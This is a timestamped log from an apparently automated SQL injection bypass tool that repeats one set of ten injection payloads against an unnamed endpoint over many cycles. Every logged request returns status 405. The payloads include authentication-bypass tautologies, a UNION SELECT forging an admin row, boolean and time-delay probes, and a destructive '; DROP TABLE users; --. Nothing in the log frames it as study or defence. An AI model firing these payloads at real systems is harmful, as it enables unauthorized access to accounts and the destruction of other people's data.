2026-04-19 16:36:41 | SQLI_BYPASS | cycle=1 | query=' OR '1'='1 | status=405
2026-04-19 16:39:25 | SQLI_BYPASS | cycle=82 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:25 | SQLI_BYPASS | cycle=82 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:25 | SQLI_BYPASS | cycle=82 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:25 | SQLI_BYPASS | cycle=82 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:25 | SQLI_BYPASS | cycle=82 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:26 | SQLI_BYPASS | cycle=82 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:26 | SQLI_BYPASS | cycle=82 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:26 | SQLI_BYPASS | cycle=83 | query=' OR '1'='1 | status=405
2026-04-19 16:39:26 | SQLI_BYPASS | cycle=83 | query=admin' -- | status=405
2026-04-19 16:39:27 | SQLI_BYPASS | cycle=83 | query=admin' # | status=405
2026-04-19 16:39:27 | SQLI_BYPASS | cycle=83 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:27 | SQLI_BYPASS | cycle=83 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:27 | SQLI_BYPASS | cycle=83 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:28 | SQLI_BYPASS | cycle=83 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:28 | SQLI_BYPASS | cycle=83 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:28 | SQLI_BYPASS | cycle=83 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:28 | SQLI_BYPASS | cycle=83 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:29 | SQLI_BYPASS | cycle=84 | query=' OR '1'='1 | status=405
2026-04-19 16:39:29 | SQLI_BYPASS | cycle=84 | query=admin' -- | status=405
2026-04-19 16:39:29 | SQLI_BYPASS | cycle=84 | query=admin' # | status=405
2026-04-19 16:39:29 | SQLI_BYPASS | cycle=84 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:29 | SQLI_BYPASS | cycle=84 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:30 | SQLI_BYPASS | cycle=84 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:30 | SQLI_BYPASS | cycle=84 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:30 | SQLI_BYPASS | cycle=84 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:30 | SQLI_BYPASS | cycle=84 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:31 | SQLI_BYPASS | cycle=84 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:31 | SQLI_BYPASS | cycle=85 | query=' OR '1'='1 | status=405
2026-04-19 16:39:31 | SQLI_BYPASS | cycle=85 | query=admin' -- | status=405
2026-04-19 16:39:31 | SQLI_BYPASS | cycle=85 | query=admin' # | status=405
2026-04-19 16:39:31 | SQLI_BYPASS | cycle=85 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:31 | SQLI_BYPASS | cycle=85 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:32 | SQLI_BYPASS | cycle=85 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:32 | SQLI_BYPASS | cycle=85 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:32 | SQLI_BYPASS | cycle=85 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:32 | SQLI_BYPASS | cycle=85 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:32 | SQLI_BYPASS | cycle=85 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:33 | SQLI_BYPASS | cycle=86 | query=' OR '1'='1 | status=405
2026-04-19 16:39:33 | SQLI_BYPASS | cycle=86 | query=admin' -- | status=405
2026-04-19 16:39:33 | SQLI_BYPASS | cycle=86 | query=admin' # | status=405
2026-04-19 16:39:33 | SQLI_BYPASS | cycle=86 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:33 | SQLI_BYPASS | cycle=86 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:34 | SQLI_BYPASS | cycle=86 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:34 | SQLI_BYPASS | cycle=86 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:34 | SQLI_BYPASS | cycle=86 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:34 | SQLI_BYPASS | cycle=86 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:34 | SQLI_BYPASS | cycle=86 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:35 | SQLI_BYPASS | cycle=87 | query=' OR '1'='1 | status=405
2026-04-19 16:39:35 | SQLI_BYPASS | cycle=87 | query=admin' -- | status=405
2026-04-19 16:39:35 | SQLI_BYPASS | cycle=87 | query=admin' # | status=405
2026-04-19 16:39:35 | SQLI_BYPASS | cycle=87 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:36 | SQLI_BYPASS | cycle=87 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:36 | SQLI_BYPASS | cycle=87 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:36 | SQLI_BYPASS | cycle=87 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:36 | SQLI_BYPASS | cycle=87 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:36 | SQLI_BYPASS | cycle=87 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:37 | SQLI_BYPASS | cycle=87 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:37 | SQLI_BYPASS | cycle=88 | query=' OR '1'='1 | status=405
2026-04-19 16:39:37 | SQLI_BYPASS | cycle=88 | query=admin' -- | status=405
2026-04-19 16:39:37 | SQLI_BYPASS | cycle=88 | query=admin' # | status=405
2026-04-19 16:39:38 | SQLI_BYPASS | cycle=88 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:38 | SQLI_BYPASS | cycle=88 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:38 | SQLI_BYPASS | cycle=88 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:38 | SQLI_BYPASS | cycle=88 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:38 | SQLI_BYPASS | cycle=88 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:39 | SQLI_BYPASS | cycle=88 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:39 | SQLI_BYPASS | cycle=88 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:39 | SQLI_BYPASS | cycle=89 | query=' OR '1'='1 | status=405
2026-04-19 16:39:39 | SQLI_BYPASS | cycle=89 | query=admin' -- | status=405
2026-04-19 16:39:39 | SQLI_BYPASS | cycle=89 | query=admin' # | status=405
2026-04-19 16:39:39 | SQLI_BYPASS | cycle=89 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:40 | SQLI_BYPASS | cycle=89 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:40 | SQLI_BYPASS | cycle=89 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:40 | SQLI_BYPASS | cycle=89 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:40 | SQLI_BYPASS | cycle=89 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:40 | SQLI_BYPASS | cycle=89 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:41 | SQLI_BYPASS | cycle=89 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:41 | SQLI_BYPASS | cycle=90 | query=' OR '1'='1 | status=405
2026-04-19 16:39:41 | SQLI_BYPASS | cycle=90 | query=admin' -- | status=405
2026-04-19 16:39:41 | SQLI_BYPASS | cycle=90 | query=admin' # | status=405
2026-04-19 16:39:42 | SQLI_BYPASS | cycle=90 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:42 | SQLI_BYPASS | cycle=90 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:42 | SQLI_BYPASS | cycle=90 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:42 | SQLI_BYPASS | cycle=90 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:43 | SQLI_BYPASS | cycle=90 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:43 | SQLI_BYPASS | cycle=90 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:43 | SQLI_BYPASS | cycle=90 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:43 | SQLI_BYPASS | cycle=91 | query=' OR '1'='1 | status=405
2026-04-19 16:39:44 | SQLI_BYPASS | cycle=91 | query=admin' -- | status=405
2026-04-19 16:39:44 | SQLI_BYPASS | cycle=91 | query=admin' # | status=405
2026-04-19 16:39:44 | SQLI_BYPASS | cycle=91 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:44 | SQLI_BYPASS | cycle=91 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:44 | SQLI_BYPASS | cycle=91 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:44 | SQLI_BYPASS | cycle=91 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:45 | SQLI_BYPASS | cycle=91 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:45 | SQLI_BYPASS | cycle=91 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:45 | SQLI_BYPASS | cycle=91 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:45 | SQLI_BYPASS | cycle=92 | query=' OR '1'='1 | status=405
2026-04-19 16:39:45 | SQLI_BYPASS | cycle=92 | query=admin' -- | status=405
2026-04-19 16:39:46 | SQLI_BYPASS | cycle=92 | query=admin' # | status=405
2026-04-19 16:39:46 | SQLI_BYPASS | cycle=92 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:46 | SQLI_BYPASS | cycle=92 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:46 | SQLI_BYPASS | cycle=92 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:47 | SQLI_BYPASS | cycle=92 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:47 | SQLI_BYPASS | cycle=92 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:47 | SQLI_BYPASS | cycle=92 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:47 | SQLI_BYPASS | cycle=92 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:47 | SQLI_BYPASS | cycle=93 | query=' OR '1'='1 | status=405
2026-04-19 16:39:48 | SQLI_BYPASS | cycle=93 | query=admin' -- | status=405
2026-04-19 16:39:48 | SQLI_BYPASS | cycle=93 | query=admin' # | status=405
2026-04-19 16:39:48 | SQLI_BYPASS | cycle=93 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:48 | SQLI_BYPASS | cycle=93 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:48 | SQLI_BYPASS | cycle=93 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:48 | SQLI_BYPASS | cycle=93 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:49 | SQLI_BYPASS | cycle=93 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:49 | SQLI_BYPASS | cycle=93 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:49 | SQLI_BYPASS | cycle=93 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:49 | SQLI_BYPASS | cycle=94 | query=' OR '1'='1 | status=405
2026-04-19 16:39:50 | SQLI_BYPASS | cycle=94 | query=admin' -- | status=405
2026-04-19 16:39:50 | SQLI_BYPASS | cycle=94 | query=admin' # | status=405
2026-04-19 16:39:50 | SQLI_BYPASS | cycle=94 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:50 | SQLI_BYPASS | cycle=94 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:50 | SQLI_BYPASS | cycle=94 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:50 | SQLI_BYPASS | cycle=94 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:51 | SQLI_BYPASS | cycle=94 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:51 | SQLI_BYPASS | cycle=94 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:51 | SQLI_BYPASS | cycle=94 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:51 | SQLI_BYPASS | cycle=95 | query=' OR '1'='1 | status=405
2026-04-19 16:39:51 | SQLI_BYPASS | cycle=95 | query=admin' -- | status=405
2026-04-19 16:39:52 | SQLI_BYPASS | cycle=95 | query=admin' # | status=405
2026-04-19 16:39:52 | SQLI_BYPASS | cycle=95 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:52 | SQLI_BYPASS | cycle=95 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:52 | SQLI_BYPASS | cycle=95 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:52 | SQLI_BYPASS | cycle=95 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:53 | SQLI_BYPASS | cycle=95 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:53 | SQLI_BYPASS | cycle=95 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:53 | SQLI_BYPASS | cycle=95 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:53 | SQLI_BYPASS | cycle=96 | query=' OR '1'='1 | status=405
2026-04-19 16:39:53 | SQLI_BYPASS | cycle=96 | query=admin' -- | status=405
2026-04-19 16:39:54 | SQLI_BYPASS | cycle=96 | query=admin' # | status=405
2026-04-19 16:39:54 | SQLI_BYPASS | cycle=96 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:54 | SQLI_BYPASS | cycle=96 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:54 | SQLI_BYPASS | cycle=96 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:54 | SQLI_BYPASS | cycle=96 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:55 | SQLI_BYPASS | cycle=96 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:55 | SQLI_BYPASS | cycle=96 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:55 | SQLI_BYPASS | cycle=96 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:55 | SQLI_BYPASS | cycle=97 | query=' OR '1'='1 | status=405
2026-04-19 16:39:55 | SQLI_BYPASS | cycle=97 | query=admin' -- | status=405
2026-04-19 16:39:56 | SQLI_BYPASS | cycle=97 | query=admin' # | status=405
2026-04-19 16:39:56 | SQLI_BYPASS | cycle=97 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:56 | SQLI_BYPASS | cycle=97 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:56 | SQLI_BYPASS | cycle=97 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:57 | SQLI_BYPASS | cycle=97 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:57 | SQLI_BYPASS | cycle=97 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:57 | SQLI_BYPASS | cycle=97 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:57 | SQLI_BYPASS | cycle=97 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:58 | SQLI_BYPASS | cycle=98 | query=' OR '1'='1 | status=405
2026-04-19 16:39:58 | SQLI_BYPASS | cycle=98 | query=admin' -- | status=405
2026-04-19 16:39:58 | SQLI_BYPASS | cycle=98 | query=admin' # | status=405
2026-04-19 16:39:58 | SQLI_BYPASS | cycle=98 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:39:58 | SQLI_BYPASS | cycle=98 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:39:58 | SQLI_BYPASS | cycle=98 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:39:59 | SQLI_BYPASS | cycle=98 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:39:59 | SQLI_BYPASS | cycle=98 | query=admin' OR 'a'='a | status=405
2026-04-19 16:39:59 | SQLI_BYPASS | cycle=98 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:39:59 | SQLI_BYPASS | cycle=98 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:39:59 | SQLI_BYPASS | cycle=99 | query=' OR '1'='1 | status=405
2026-04-19 16:40:00 | SQLI_BYPASS | cycle=99 | query=admin' -- | status=405
2026-04-19 16:40:00 | SQLI_BYPASS | cycle=99 | query=admin' # | status=405
2026-04-19 16:40:00 | SQLI_BYPASS | cycle=99 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:40:00 | SQLI_BYPASS | cycle=99 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:40:01 | SQLI_BYPASS | cycle=99 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:40:01 | SQLI_BYPASS | cycle=99 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:40:01 | SQLI_BYPASS | cycle=99 | query=admin' OR 'a'='a | status=405
2026-04-19 16:40:01 | SQLI_BYPASS | cycle=99 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:40:01 | SQLI_BYPASS | cycle=99 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:40:02 | SQLI_BYPASS | cycle=100 | query=' OR '1'='1 | status=405
2026-04-19 16:40:02 | SQLI_BYPASS | cycle=100 | query=admin' -- | status=405
2026-04-19 16:40:02 | SQLI_BYPASS | cycle=100 | query=admin' # | status=405
2026-04-19 16:40:02 | SQLI_BYPASS | cycle=100 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:40:02 | SQLI_BYPASS | cycle=100 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:40:03 | SQLI_BYPASS | cycle=100 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:40:03 | SQLI_BYPASS | cycle=100 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:40:03 | SQLI_BYPASS | cycle=100 | query=admin' OR 'a'='a | status=405
2026-04-19 16:40:03 | SQLI_BYPASS | cycle=100 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:40:03 | SQLI_BYPASS | cycle=100 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:40:04 | SQLI_BYPASS | cycle=101 | query=' OR '1'='1 | status=405
2026-04-19 16:40:04 | SQLI_BYPASS | cycle=101 | query=admin' -- | status=405
2026-04-19 16:40:04 | SQLI_BYPASS | cycle=101 | query=admin' # | status=405
2026-04-19 16:40:04 | SQLI_BYPASS | cycle=101 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:40:04 | SQLI_BYPASS | cycle=101 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:40:05 | SQLI_BYPASS | cycle=101 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:40:05 | SQLI_BYPASS | cycle=101 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:40:05 | SQLI_BYPASS | cycle=101 | query=admin' OR 'a'='a | status=405
2026-04-19 16:40:05 | SQLI_BYPASS | cycle=101 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:40:05 | SQLI_BYPASS | cycle=101 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:40:06 | SQLI_BYPASS | cycle=102 | query=' OR '1'='1 | status=405
2026-04-19 16:40:06 | SQLI_BYPASS | cycle=102 | query=admin' -- | status=405
2026-04-19 16:40:06 | SQLI_BYPASS | cycle=102 | query=admin' # | status=405
2026-04-19 16:40:06 | SQLI_BYPASS | cycle=102 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:40:06 | SQLI_BYPASS | cycle=102 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:40:07 | SQLI_BYPASS | cycle=102 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:40:07 | SQLI_BYPASS | cycle=102 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:40:07 | SQLI_BYPASS | cycle=102 | query=admin' OR 'a'='a | status=405
2026-04-19 16:40:07 | SQLI_BYPASS | cycle=102 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:40:07 | SQLI_BYPASS | cycle=102 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:40:08 | SQLI_BYPASS | cycle=103 | query=' OR '1'='1 | status=405
2026-04-19 16:40:08 | SQLI_BYPASS | cycle=103 | query=admin' -- | status=405
2026-04-19 16:40:08 | SQLI_BYPASS | cycle=103 | query=admin' # | status=405
2026-04-19 16:40:08 | SQLI_BYPASS | cycle=103 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:40:08 | SQLI_BYPASS | cycle=103 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:40:09 | SQLI_BYPASS | cycle=103 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:40:09 | SQLI_BYPASS | cycle=103 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:40:09 | SQLI_BYPASS | cycle=103 | query=admin' OR 'a'='a | status=405
2026-04-19 16:40:09 | SQLI_BYPASS | cycle=103 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:40:09 | SQLI_BYPASS | cycle=103 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:40:10 | SQLI_BYPASS | cycle=104 | query=' OR '1'='1 | status=405
2026-04-19 16:40:10 | SQLI_BYPASS | cycle=104 | query=admin' -- | status=405
2026-04-19 16:40:10 | SQLI_BYPASS | cycle=104 | query=admin' # | status=405
2026-04-19 16:40:10 | SQLI_BYPASS | cycle=104 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:40:10 | SQLI_BYPASS | cycle=104 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:40:11 | SQLI_BYPASS | cycle=104 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:40:11 | SQLI_BYPASS | cycle=104 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:40:11 | SQLI_BYPASS | cycle=104 | query=admin' OR 'a'='a | status=405
2026-04-19 16:40:11 | SQLI_BYPASS | cycle=104 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:40:11 | SQLI_BYPASS | cycle=104 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:40:12 | SQLI_BYPASS | cycle=105 | query=' OR '1'='1 | status=405
2026-04-19 16:40:12 | SQLI_BYPASS | cycle=105 | query=admin' -- | status=405
2026-04-19 16:40:12 | SQLI_BYPASS | cycle=105 | query=admin' # | status=405
2026-04-19 16:40:12 | SQLI_BYPASS | cycle=105 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:40:13 | SQLI_BYPASS | cycle=105 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:40:13 | SQLI_BYPASS | cycle=105 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:40:13 | SQLI_BYPASS | cycle=105 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:40:13 | SQLI_BYPASS | cycle=105 | query=admin' OR 'a'='a | status=405
2026-04-19 16:40:13 | SQLI_BYPASS | cycle=105 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:40:14 | SQLI_BYPASS | cycle=105 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:40:14 | SQLI_BYPASS | cycle=106 | query=' OR '1'='1 | status=405
2026-04-19 16:40:14 | SQLI_BYPASS | cycle=106 | query=admin' -- | status=405
2026-04-19 16:40:14 | SQLI_BYPASS | cycle=106 | query=admin' # | status=405
2026-04-19 16:40:15 | SQLI_BYPASS | cycle=106 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:40:15 | SQLI_BYPASS | cycle=106 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:40:15 | SQLI_BYPASS | cycle=106 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:40:15 | SQLI_BYPASS | cycle=106 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:40:16 | SQLI_BYPASS | cycle=106 | query=admin' OR 'a'='a | status=405
2026-04-19 16:40:16 | SQLI_BYPASS | cycle=106 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:40:16 | SQLI_BYPASS | cycle=106 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:40:16 | SQLI_BYPASS | cycle=107 | query=' OR '1'='1 | status=405
2026-04-19 16:40:17 | SQLI_BYPASS | cycle=107 | query=admin' -- | status=405
2026-04-19 16:40:17 | SQLI_BYPASS | cycle=107 | query=admin' # | status=405
2026-04-19 16:40:17 | SQLI_BYPASS | cycle=107 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:40:17 | SQLI_BYPASS | cycle=107 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:40:17 | SQLI_BYPASS | cycle=107 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:40:18 | SQLI_BYPASS | cycle=107 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:40:18 | SQLI_BYPASS | cycle=107 | query=admin' OR 'a'='a | status=405
2026-04-19 16:40:18 | SQLI_BYPASS | cycle=107 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:40:18 | SQLI_BYPASS | cycle=107 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:40:18 | SQLI_BYPASS | cycle=108 | query=' OR '1'='1 | status=405
2026-04-19 16:40:19 | SQLI_BYPASS | cycle=108 | query=admin' -- | status=405
2026-04-19 16:40:19 | SQLI_BYPASS | cycle=108 | query=admin' # | status=405
2026-04-19 16:40:19 | SQLI_BYPASS | cycle=108 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:40:19 | SQLI_BYPASS | cycle=108 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:40:20 | SQLI_BYPASS | cycle=108 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:40:20 | SQLI_BYPASS | cycle=108 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:40:20 | SQLI_BYPASS | cycle=108 | query=admin' OR 'a'='a | status=405
2026-04-19 16:40:20 | SQLI_BYPASS | cycle=108 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:40:21 | SQLI_BYPASS | cycle=108 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:40:21 | SQLI_BYPASS | cycle=109 | query=' OR '1'='1 | status=405
2026-04-19 16:40:21 | SQLI_BYPASS | cycle=109 | query=admin' -- | status=405
2026-04-19 16:40:21 | SQLI_BYPASS | cycle=109 | query=admin' # | status=405
2026-04-19 16:40:21 | SQLI_BYPASS | cycle=109 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
